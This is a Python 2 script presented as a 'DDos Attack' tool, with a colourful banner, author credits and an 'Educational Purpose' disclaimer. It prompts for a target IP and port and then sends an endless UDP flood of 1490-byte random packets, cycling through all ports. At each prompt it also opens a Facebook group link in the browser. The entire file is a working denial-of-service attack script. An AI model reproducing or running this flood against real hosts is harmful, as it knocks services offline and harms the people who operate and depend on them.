import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print"""
\033[93;1m              #    #          #    #     # ### #     # "
\033[1;32m             # #   #         # #   ##   ##  #  ##    # "
\033[91;1m            #   #  #        #   #  # # # #  #  # #   # "
\033[95;1m           #     # #       #     # #  #  #  #  #  #  # "
\033[94;1m           ####### #       ####### #     #  #  #   # # "
\033[93;1m           #     # #       #     # #     #  #  #    ## "
\033[1;32m           #     # ####### #     # #     # ### #     # "
print"""
print """
\033[0m          |------------------------------------|
\033[1;92m          |  Author \033[1;93m:     Cyber ALAMiN         |
\033[1;92m          |  Fb \033[1;93m:         Cyber ALAMiN         |
\033[1;92m          |  Github \033[1;93m:     Cyber-ALAMiN         |
\033[1;92m          |  Disclaimer \033[1;93m: Educational Purpose  |
\033[0m          |------------------------------------|
 
\033[91;1m           This Tool Made By Cyber ALAMiN (Psycho)"""
                          
ip = raw_input("IP Target : ")
os.system('xdg-open https://www.facebook.com/groups/923481061680273/?ref=share')
port = input("Port       : ")
os.system('xdg-open https://www.facebook.com/groups/923481061680273/?ref=share')
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(4)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
       
